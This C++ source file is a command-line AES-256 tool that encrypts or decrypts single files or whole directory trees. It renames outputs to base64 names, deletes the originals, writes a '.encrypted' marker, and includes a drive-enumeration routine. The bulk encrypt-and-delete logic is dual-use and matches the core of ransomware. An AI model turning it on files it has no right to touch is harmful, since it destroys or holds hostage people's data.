#include "Header.h"

using experimental::filesystem::recursive_directory_iterator;

char driveList[5][3];
HANDLE hDrives[];
string szInput = "", szOutput = "", szKey = "", szDirectory = "";
BOOL bDecrypt = false, bDirectory = false, bWord = false;

void getDrives()
{
	DWORD dwMaxDrives = 100;
	char drives[100];

	int check = GetLogicalDriveStrings(dwMaxDrives, drives);

	if (check != 0)
	{
		int count = 0;
		for (int i = 0, c = 0; i < check; i++, c++) 
		{
			if (drives[i] != NULL) 
			{
				if (drives[i] != '\\') 
				{
					if (c == 0)
						printf("(");
					printf("%c", drives[i]);
					driveList[count][c] = drives[i];
				}
			}
			else {
				printf(")\n");
				count++;
				c = -1;
			}
		}
	}
}

void _EncryptFile(Aes256 aes, ByteArray* enc, FILE* input, FILE* output, size_t file_len) {
	enc->clear();

	aes.encrypt_start(file_len, *enc);

	fwrite(enc->data(), enc->size(), 1, output);

	while (!feof(input)) {
		unsigned char buffer[1024];
		size_t buffer_len;

		buffer_len = fread(buffer, 1, 1024, input);

		if (buffer_len > 0) {
			enc->clear();
			aes.encrypt_continue(buffer, buffer_len, *enc);
			fwrite(enc->data(), enc->size(), 1, output);
		}
	}

	enc->clear();
	aes.encrypt_end(*enc);
}

void _DecryptFile(Aes256 aes, ByteArray* enc, FILE* input, FILE* output, size_t file_len) {
	aes.decrypt_start(file_len);

	while (!feof(input)) {
		unsigned char buffer[1024];
		size_t buffer_len;

		buffer_len = fread(buffer, 1, 1024, input);

		if (buffer_len > 0) {
			enc->clear();
			aes.decrypt_continue(buffer, buffer_len, *enc);
			fwrite(enc->data(), enc->size(), 1, output);
		}
	}

	enc->clear();
	aes.decrypt_end(*enc);
}

int inputError() {
	printf("\n**************************\n* Can't read input file. *\n**************************\n");
	return 1;
}

int outputError() {
	printf("\n***************************\n* Can't read output file. *\n***************************\n");
	return 1;
}

int paramError() {
	printf("\n***********************\n* Invalid parameters. *\n***********************\n");
	return 1;
}

int main(int argc, char** argv) {
	ByteArray key, enc, word;
	size_t file_len;

	FILE* input, *output, *encrypt;

	srand((unsigned int)time(0));

	for (int i = 1; i < argc; i++) {
		if (!strcmp(argv[i], "-dir")) {
			szDirectory = argv[i + 1];
			bDirectory = true;
			i++;
		}
		else if (!strcmp(argv[i], "-f")) {
			szInput = argv[i + 1];
			i++;
		}
		else if (!strcmp(argv[i], "-k")) {
			szKey = argv[i + 1];
			i++;
		}
		else if (!strcmp(argv[i], "-word")) {
			szInput = argv[i + 1];
			bWord = true;
			i++;
		}
		else if (!strcmp(argv[i], "-d")) {
			bDecrypt = true;
			i++;
		}
	}


	if (!bDecrypt) {
		szOutput = base64_encode((const unsigned char*)szInput.c_str(), strlen(szInput.c_str()));
	}
	else if (!bDirectory && bDecrypt) {
		szOutput = base64_decode(szInput);

		if (strlen(szInput.c_str()) <= 0 || strlen(szOutput.c_str()) <= 0 || strlen(szKey.c_str()) <= 0)
			return paramError();
	}

	size_t key_len = 0;
	while (szKey[key_len] != 0)
		key.push_back(szKey[key_len++]);

	if (bDirectory) {
		int fileNumber = 0;

		vector<experimental::filesystem::v1::recursive_directory_iterator::value_type> _files;

		for (auto& dirEntry : recursive_directory_iterator(szDirectory.append("\\"))) {
			if (dirEntry.path().string().find(".encrypted") != string::npos) {
				bDecrypt = true;
				continue;
			}
			_files.push_back(dirEntry);
		}
			

		for (auto& dirEntry : _files) {

			if (dirEntry.path().string().find("System Volume") != string::npos || experimental::filesystem::is_directory(dirEntry.path()))
				continue;

			szInput = dirEntry.path().string();

			char _fileDrive[64], _fileDir[64], _fileName[64], _fileExt[64];
			_splitpath_s(szInput.c_str(), _fileDrive, _fileDir, _fileName, _fileExt);

			string szFileName = _fileName + string(_fileExt);

			if (!bDecrypt)
				szOutput = base64_encode((const unsigned char*)szFileName.c_str(), strlen(szFileName.c_str()));
			else
				szOutput = base64_decode(szFileName);
			
			fileNumber++;
			cout << "\n" << fileNumber << " : " << szFileName << "\n";

			printf("\n	Input Directory:\n		");
			cout << szInput << endl;
			
			if (strlen(szInput.c_str()) <= 0 || strlen(szOutput.c_str()) <= 0 || strlen(szKey.c_str()) <= 0)
				return paramError();

			fopen_s(&input, szInput.c_str(), "rb");

			if (input == 0)
				return inputError();

			printf("\n	Output Directory:\n		");
			cout << string(string(_fileDrive) + string(_fileDir) + szOutput).c_str() << endl;

			fopen_s(&output, string(string(_fileDrive) + string(_fileDir) + szOutput).c_str(), "wb");
			if (output == 0)
				return outputError();

			Aes256 aes(key);

			fseek(input, 0, SEEK_END);

			file_len = ftell(input);

			fseek(input, 0, SEEK_SET);

			if (bDecrypt) {
				printf("\n	Successfully Decrypted.\n\n");
				_DecryptFile(aes, &enc, input, output, file_len);
			}
			else {
				printf("\n	Successfully Encrypted.\n\n");
				_EncryptFile(aes, &enc, input, output, file_len);
			}
				

			fwrite(enc.data(), enc.size(), 1, output);

			fclose(input);
			fclose(output);

			remove(szInput.c_str());
		}

		if (!bDecrypt)
			fopen_s(&encrypt, string(string(szDirectory) + ".encrypted").c_str(), "wb");
		else
			remove(string(string(szDirectory) + ".encrypted").c_str());	
	}
	else {
		fopen_s(&input, szInput.c_str(), "rb");

		if (input == 0)
			return inputError();

		fopen_s(&output, szOutput.c_str(), "wb");
		if (output == 0)
			return outputError();

		Aes256 aes(key);

		fseek(input, 0, SEEK_END);

		file_len = ftell(input);

		fseek(input, 0, SEEK_SET);

		if (bDecrypt) {
			printf("\n	Successfully Decrypted.\n\n");
			_DecryptFile(aes, &enc, input, output, file_len);
		}
			
		else {
			printf("\n	Successfully Encrypted.\n\n");
			_EncryptFile(aes, &enc, input, output, file_len);
		}
			
		fwrite(enc.data(), enc.size(), 1, output);

		fclose(input);
		fclose(output);

		remove(szInput.c_str());

		return 0;
	}
}



